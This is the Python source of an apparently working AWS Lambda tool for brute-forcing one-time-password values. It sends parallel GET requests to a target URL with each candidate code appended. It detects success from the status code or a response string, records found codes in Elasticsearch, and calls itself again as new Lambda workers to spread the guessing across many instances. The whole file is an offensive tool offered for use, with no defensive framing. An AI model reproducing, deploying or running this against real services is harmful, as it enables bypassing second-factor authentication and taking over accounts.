#!/usr/bin/env python2
# need to make sure this file and all imports are world readable
# before zip and upload to aws lambda
from __future__ import print_function

import sys
# include the lib folder when searching for libraries
sys.path.insert(0, 'lib')
import site
site.addsitedir("lib")
if (sys.version_info < (3, 0)):
    reload(sys)
    sys.setdefaultencoding('utf8')
# basic operations
import os
import pprint
import json
import datetime
import traceback
import time

import boto3

import requests
import multiprocessing
import certifi
from elasticsearch import Elasticsearch

global_config = None
global_context = None

# this is the main function to get a command and do something
def lambda_handler(config=None, context=None):
    global global_config, global_context
    global_config = config
    global_context = context
    print("starting")
    command_result = action(global_config)


def add_job_to_es(commands, response=None):
    # connect to elasticsearch
    es_index_results = str(commands['backend']['es_index_results']+'-'+commands['action'])
    es_index_commands = str(commands['backend']['es_index_commands'])
    es_index_jobs = str(commands['backend']['es_index_jobs'])
    es_user = commands['backend']['es_user']
    es_pass = commands['backend']['es_pass']
    es_url = commands['backend']['es_url']
    try:
        es = Elasticsearch([es_url], http_auth=(es_user, es_pass), verify_certs=True, ca_certs=certifi.where())
        res = es.index(index=es_index_jobs, doc_type='result', id=commands['id'], body=commands)
        if res['created']:
            print("======[Job]=====================")
            # refresh the data in elasticsearch
            es.indices.refresh(index=es_index_jobs)
            es_item = es.get(index=es_index_jobs, doc_type='result', id=commands['id'])
            pprint.pprint(es_item['_source'])
            print("======[Job]=====================")
        else:
            print("error storing job info in elasticsearch")
    except Exception as e:
        print("exception:", e.message, e.args, dir(e))
        traceback.print_exc()


def add_result_to_es(commands, response=None):
    # connect to elasticsearch
    es_index_results = str(commands['backend']['es_index_results']+'-'+commands['action'])
    es_index_commands = str(commands['backend']['es_index_commands'])
    es_index_jobs = str(commands['backend']['es_index_jobs'])
    es_user = commands['backend']['es_user']
    es_pass = commands['backend']['es_pass']
    es_url = commands['backend']['es_url']
    try:
        esdata = response['result'].copy()
        es = Elasticsearch([es_url], http_auth=(es_user, es_pass), verify_certs=True, ca_certs=certifi.where())
        res = es.index(index=es_index_results, doc_type='result', id=str(commands['id']), body=esdata)
        if res['created']:
            print("========put-esdata=========================")
            pprint.pprint(esdata)
            print("========end-esdata=========================")
    except Exception as e:
        print("exception:", e.message, e.args, dir(e))
        traceback.print_exc()


def brute_otp_run(commands=None, otp_value=None):
    target_url = commands['url'] + str(otp_value)
    s = requests.session()
    s.headers = {'Connection': "Close"}
    if 'allow_redirects' in commands:
        resp = s.get(target_url, allow_redirects=commands['allow_redirects'])
    else:
        resp = s.get(target_url)
    s.close()
    if 'success' in commands:
        if 'code' in commands['success']:
            if commands['success']['code'] == resp.status_code or commands['success']['string'] in resp.text:
                # we found the OTP value, now report to the backend
                response = dict()
                response['result'] = dict()
                response['result']['otp_value'] = otp_value
                add_result_to_es(commands, response)
            # check if the keyspace has been completed
            for respline in resp.text.split('\n'):
                if "otp guessed: " in respline:
                    status_line = respline[respline.find("otp guessed: ")+13:]
                    total_otps = status_line[status_line.find("/")+1:]
                    tried_otps = status_line[:status_line.find("/")]
                    if int(tried_otps) >= int(total_otps):
                        add_job_to_es(commands)

def chunks(l, n):
    for i in range(0, len(l), n):
        yield l[i:i + n]

def brute_otp(commands):
    start_time = time.time()

    print(commands)

    # start
    if len(commands['otp_values']) <= commands['otp_per_instance']:
        print("starting brute force with:", commands['otp_values'])
        procs = []
        for otp_value in commands['otp_values']:
            procs.append(multiprocessing.Process(target=brute_otp_run, kwargs={
                'commands': commands.copy(),
                'otp_value': otp_value,
            }))
        for p in procs:
            p.start()
        for p in procs:
            p.join()
    else:
        # split commands['otp_values'] into commands['otp_per_instance']
        print("creating chunks")
        for chunk in chunks(commands['otp_values'], commands['otp_per_instance']):
            print("chunk:", chunk)
            #spawn_new_worker
            spawn_new_worker(chunk=chunk)


    elapsed_time = time.time() - start_time
    print("time taken to start workers: " + str(elapsed_time) + "s")


def spawn_new_worker(chunk=None):
    global global_config, global_context

    commands = global_config.copy()
    commands['otp_values'] = chunk
    commands = json.dumps(commands)

    arn = global_context.invoked_function_arn.split(':')
    region = arn[3]
    lambda_function_name = arn[6]
    
    print("starting new lambda worker for:"+str(chunk))
    
    client = boto3.client('lambda',
        region_name=region,
        )
    response = client.invoke(
        FunctionName=lambda_function_name,
        InvocationType='Event',
        LogType='None',
        Payload=commands,
    )
    print("done: ",response)

def action(commands):
    print("action start")
    if 'action' in commands:
        if commands['action'] == 'brute_otp':
	       brute_otp(commands)
